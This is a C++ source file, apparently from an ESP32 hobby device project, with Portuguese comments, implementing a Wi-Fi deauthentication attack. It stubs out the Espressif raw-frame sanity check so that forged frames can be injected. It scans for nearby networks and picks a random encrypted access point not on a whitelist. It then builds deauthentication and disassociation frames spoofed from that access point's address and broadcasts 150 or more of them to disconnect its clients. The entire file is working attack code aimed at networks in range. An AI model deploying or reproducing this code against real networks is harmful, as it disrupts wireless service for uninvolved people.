/*
 * ARQUIVO LEGADO - MANTIDO PARA REFERÊNCIA
 */

/**
 * deauth.cpp: lida com a desautenticação de um AP local
 */

#include "deauth.h"

/** nota do desenvolvedor:
 *
 * o frame de deauth é definido aqui.
 * este é um frame bruto (camada 2)
 *
 */

// por algum motivo a espressif realmente não gosta que enviemos frames de deauth,
// então preciso fazer essa correção
extern "C" int ieee80211_raw_frame_sanity_check_custom(int32_t arg, int32_t arg2,
                                                int32_t arg3) {
  return 0;
}

// valores padrão antes de começar
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";
int Deauth::randomIndex;

/**
 * Obtém a primeira instância da classe mood
 */
Mood &Deauth::mood = Mood::getInstance();

/** nota do desenvolvedor:
 *
 * em vez de usar o frame de deauth normalmente, anexamos informações ao
 * frame de deauth e escrevemos dinamicamente as informações no frame
 *
 */

uint8_t Deauth::deauthTemp[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC,
                                  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                                  0xCC, 0x00, 0x00, 0x01, 0x00};

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];
uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/**
 * Adiciona SSIDs (ou BSSIDs) à whitelist
 * @param bssids SSIDs/BSSIDs para whitelist
 */
void Deauth::add(const std::string &bssids) {
  std::stringstream ss(bssids);
  std::string token;

  // separa info e whitelist
  while (std::getline(ss, token, ',')) {
    // remove espaços em branco
    token.erase(0, token.find_first_not_of(" \t\r\n"));
    token.erase(token.find_last_not_of(" \t\r\n") + 1);

    // adiciona à whitelist
    Serial.print(mood.getNeutral() + " Adicionando ");
    Serial.print(token.c_str());
    Serial.println(" a whitelist");
    Display::updateDisplay(mood.getNeutral(), "Adding " +
                                                  (String)token.c_str() +
                                                  " to the whitelist");
    delay(Config::shortDelay);
    whitelist.push_back(token.c_str());
  }
}

/**
 * Adiciona tudo à whitelist
 */
void Deauth::list() {
  for (const auto &bssid : Config::whitelist) {
    Deauth::add(bssid);
  }
}

/**
 * Envia um pacote
 * @param buf Pacote para enviar
 * @param len Comprimento do pacote
 * @param sys_seq Ignore isso, apenas deixe falso
 */
bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sys_seq);
  delay(102);

  return (err == ESP_OK);
}

/**
 * Verifica se o endereço de origem do pacote é um broadcast
 * fonte:
 * https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
 * @param mac Endereço Mac para verificar
 */
bool Deauth::broadcast(uint8_t *mac) {
  for (uint8_t i = 0; i < 6; i++) {
    if (mac[i] != broadcastAddr[i])
      return false;
  }

  return true;
}

/**
 * Formata Endereço Mac como String, então imprime
 * @param mac Endereço para imprimir
 */
void Deauth::printMac(uint8_t *mac) {
  String macStr = printMacStr(mac);
  Serial.println(macStr);
  Display::updateDisplay(mood.getNeutral(), "AP BSSID: " + macStr);
}

/**
 * Função destinada a imprimir Mac como uma String usada em printMac()
 * @param mac Mac para usar
 */
String Deauth::printMacStr(uint8_t *mac) {
  char buf[18]; // 17 para MAC, 1 para terminador nulo
  snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
           mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

/**
 * Seleciona um AP para deauth, retorna um booleano baseado em se o scan e seleção
 * foram bem sucedidos
 */
bool Deauth::select() {
  // reseta valores
  Deauth::randomAP = "";
  Deauth::randomIndex = -1;

  Parasite::sendDeauthStatus(START_SCAN);

  // animação legal, pula se modo parasita
  if (!Config::parasite) {
    for (int i = 0; i < 5; ++i) {
      Serial.println(mood.getLooking1() + " Scanning for APs.");
      Display::updateDisplay(mood.getLooking1(), "Scanning  for APs.");
      delay(Config::shortDelay);
      Serial.println(mood.getLooking2() + " Scanning for APs..");
      Display::updateDisplay(mood.getLooking2(), "Scanning  for APs..");
      delay(Config::shortDelay);
      Serial.println(mood.getLooking1() + " Scanning for APs...");
      Display::updateDisplay(mood.getLooking1(), "Scanning  for APs...");
      delay(Config::shortDelay);
      Serial.println(" ");
      delay(Config::shortDelay);
    }
    delay(Config::longDelay);
  }

  // para e escaneia
  Minigotchi::monStop();

  int apCount = 0;
  // Se um canal parasita está configurado, então queremos focar nesse canal
  // Caso contrário, saímos por conta própria e escaneamos o que estiver por aí
  if (Parasite::channel > 0) {
    apCount = WiFi.scanNetworks(false, false, Parasite::channel);
  } else {
    apCount = WiFi.scanNetworks();
  }

  if (apCount > 0 && Deauth::randomIndex == -1) {
    Deauth::randomIndex = random(apCount);
    Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
    uint8_t encType = WiFi.encryptionType(Deauth::randomIndex);

    Serial.print(mood.getNeutral() + " Selected random AP: ");
    Serial.println(randomAP.c_str());
    Serial.println(" ");
    Display::updateDisplay(mood.getNeutral(),
                           "Selected random AP: " + randomAP);
    delay(Config::shortDelay);

    if (encType == WIFI_AUTH_OPEN || encType == -1) {
      Serial.println(
          mood.getNeutral() +
          " Selected AP is not encrypted. Skipping deauthentication...");
      Display::updateDisplay(
          mood.getNeutral(),
          "Selected AP is not encrypted. Skipping deauthentication...");
      delay(Config::shortDelay);
      Parasite::sendDeauthStatus(SKIPPING_UNENCRYPTED);
      return false;
    }

    // verifica ap na whitelist
    if (std::find(whitelist.begin(), whitelist.end(), randomAP) !=
        whitelist.end()) {
      Serial.println(mood.getNeutral() +
                     " Selected AP is in the whitelist. Skipping "
                     "deauthentication...");
      Display::updateDisplay(
          mood.getNeutral(),
          "Selected AP is in the whitelist. Skipping deauthentication...");
      delay(Config::shortDelay);
      Parasite::sendDeauthStatus(SKIPPING_WHITELIST);
      return false;
    }

    /** nota do desenvolvedor:
     *
     * aqui criaremos o frame de deauth usando o cabeçalho,
     * conforme encontramos o AP em questão também geramos as informações necessárias
     * para ele também...
     *
     */

    // limpa frame existente...
    std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame),
              0);
    std::fill(std::begin(Deauth::disassociateFrame),
              std::end(Deauth::disassociateFrame), 0);

    // copia template
    std::copy(Deauth::deauthTemp,
              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
              Deauth::deauthFrame);
    std::copy(Deauth::deauthTemp,
              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
              Deauth::disassociateFrame);

    Deauth::deauthFrame[0] = 0xC0; // tipo
    Deauth::deauthFrame[1] = 0x00; // subtipo
    Deauth::deauthFrame[2] = 0x00; // duração (SDK cuida disso)
    Deauth::deauthFrame[3] = 0x00; // duração (SDK cuida disso)

    Deauth::disassociateFrame[0] = 0xA0; // tipo
    Deauth::disassociateFrame[1] = 0x00; // subtipo
    Deauth::disassociateFrame[2] = 0x00; // duração (SDK cuida disso)
    Deauth::disassociateFrame[3] = 0x00; // duração (SDK cuida disso)

    // bssid
    uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);

    /** nota do desenvolvedor:
     *
     * addr1: end receptor
     * addr2: end remetente
     * addr3: end filtragem
     *
     */

    // copia nossos mac(s) para o cabeçalho
    std::copy(Deauth::broadcastAddr,
              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
              Deauth::deauthFrame + 4);
    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);

    std::copy(Deauth::broadcastAddr,
              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
              Deauth::disassociateFrame + 4);
    std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
    std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);

    // verifica se isso é um broadcast
    if (!broadcast(Deauth::broadcastAddr)) {
      // constrói deauth
      Deauth::deauthFrame[0] = 0xC0; // tipo
      Deauth::deauthFrame[1] = 0x00; // subtipo
      Deauth::deauthFrame[2] = 0x00; // duração (SDK cuida disso)
      Deauth::deauthFrame[3] = 0x00; // duração (SDK cuida disso)

      // razão
      Deauth::deauthFrame[24] = 0x01; // razão: não especificado

      std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 10);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 16);

      // constrói desassociação
      Deauth::disassociateFrame[0] = 0xA0; // tipo
      Deauth::disassociateFrame[1] = 0x00; // subtipo
      Deauth::disassociateFrame[2] = 0x00; // duração (SDK cuida disso)
      Deauth::disassociateFrame[3] = 0x00; // duração (SDK cuida disso)

      std::copy(apBssid, apBssid + sizeof(apBssid),
                Deauth::disassociateFrame + 4);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 10);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 16);
    }

    Serial.print(mood.getNeutral() + " Full AP SSID: ");
    Serial.println(WiFi.SSID(Deauth::randomIndex));
    Display::updateDisplay(mood.getNeutral(),
                           "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));

    Serial.print(mood.getNeutral() + " AP Encryption: ");
    Serial.println(WiFi.encryptionType(Deauth::randomIndex));
    Display::updateDisplay(
        mood.getNeutral(),
        "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));

    Serial.print(mood.getNeutral() + " AP RSSI: ");
    Serial.println(WiFi.RSSI(Deauth::randomIndex));
    Display::updateDisplay(mood.getNeutral(),
                           "AP RSSI: " +
                               (String)WiFi.RSSI(Deauth::randomIndex));

    Serial.print(mood.getNeutral() + " AP BSSID: ");
    printMac(apBssid);

    Serial.print(mood.getNeutral() + " AP Channel: ");
    Serial.println(WiFi.channel(Deauth::randomIndex));
    Display::updateDisplay(mood.getNeutral(),
                           "AP Channel: " +
                               (String)WiFi.channel(Deauth::randomIndex));

    Serial.println(" ");
    delay(Config::longDelay);

    Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(),
                               WiFi.channel(Deauth::randomIndex));

    return true;
  } else if (apCount < 0) {
    Serial.println(mood.getSad() +
                   " I don't know what you did, but you screwed up!");
    Serial.println(" ");
    Display::updateDisplay(mood.getSad(), "You screwed up somehow!");

    Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR);

    delay(Config::shortDelay);
  } else {
    // bem, você se ferrou.
    Serial.println(mood.getSad() + " No access points found.");
    Serial.println(" ");
    Display::updateDisplay(mood.getSad(), "No access points found.");

    Parasite::sendDeauthStatus(NO_APS);

    delay(Config::shortDelay);
  }
  return false;
}

/**
 * Ataque de desautenticação completo
 */
void Deauth::deauth() {
  if (Config::deauth) {
    // seleciona AP
    if (Deauth::select()) {
      if (randomAP.length() > 0) {
        Serial.println(
            mood.getIntense() +
            " Starting deauthentication attack on the selected AP...");
        Serial.println(" ");
        Display::updateDisplay(mood.getIntense(),
                               "Begin deauth-attack on AP...");
        delay(Config::shortDelay);
        // define o ataque
        if (!running) {
          start();
        } else {
          Serial.println(mood.getNeutral() + " Attack is already running.");
          Serial.println(" ");
          Display::updateDisplay(mood.getNeutral(),
                                 "Attack is already running.");
          delay(Config::shortDelay);
        }
      } else {
        // ok por que você modificou a função de deauth? eu literalmente disse pra você
        // não fazer isso...
        Serial.println(mood.getBroken() +
                       " No access point selected. Use select() first.");
        Serial.println(mood.getNeutral() + " Told you so!");
        Serial.println(" ");
        Display::updateDisplay(mood.getBroken(),
                               "No access point selected. Use select() first.");
        delay(Config::shortDelay);
        Display::updateDisplay(mood.getNeutral(), "Told you so!");
        delay(Config::shortDelay);
        return;
      }
    }
  } else {
    // não faz nada se deauthing estiver desabilitado
  }
}

/**
 * Inicia ataque de deauth
 */
void Deauth::start() {
  running = true;
  int deauthFrameSize = sizeof(deauthFrame);
  int disassociateFrameSize = sizeof(disassociateFrame);
  int packets = 0;
  unsigned long startTime = millis();

  // cálculo de pacotes
  int basePacketCount = 150;
  int rssi = WiFi.RSSI(Deauth::randomIndex);
  int numDevices = WiFi.softAPgetStationNum();

  int packetCount = basePacketCount + (numDevices * 10);
  if (rssi > -50) {
    packetCount /= 2; // sinal forte
  } else if (rssi < -80) {
    packetCount *= 2; // sinal fraco
  }

  Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(),
                             WiFi.channel(Deauth::randomIndex));

  // envia o deauth 150 vezes
  for (int i = 0; i < packetCount; ++i) {
    if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
        Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      packets++;
      float pps = packets / (float)(millis() - startTime) * 1000;

      // mostra pps
      if (!isinf(pps)) {
        Serial.print(mood.getIntense() + " Packets per second: ");
        Serial.print(pps);
        Serial.print(" pkt/s");
        Serial.println(" (AP:" + randomAP + ")");
        Display::updateDisplay(mood.getIntense(),
                               "Packets per second: " + (String)pps + " pkt/s" +
                                   " (AP:" + randomAP + ")");
      }
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(mood.getBroken() + " Both packets failed to send!");
      Display::updateDisplay(mood.getBroken(), "Both packets failed to send!");
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(mood.getBroken() + " Deauthentication failed to send!");
      Display::updateDisplay(mood.getBroken(), "Deauth failed to send!");
    } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(mood.getBroken() + " Disassociation failed to send!");
      Display::updateDisplay(mood.getBroken(), "Disassoc failed to send!");
    } else {
      Serial.println(mood.getBroken() + " Unable to calculate pkt/s!");
      Display::updateDisplay(mood.getBroken(), "Unable to calculate pkt/s!");
    }
  }

  Serial.println(" ");
  Serial.println(mood.getHappy() + " Attack finished!");
  Serial.println(" ");
  Display::updateDisplay(mood.getHappy(), "Attack finished!");
  running = false;
}
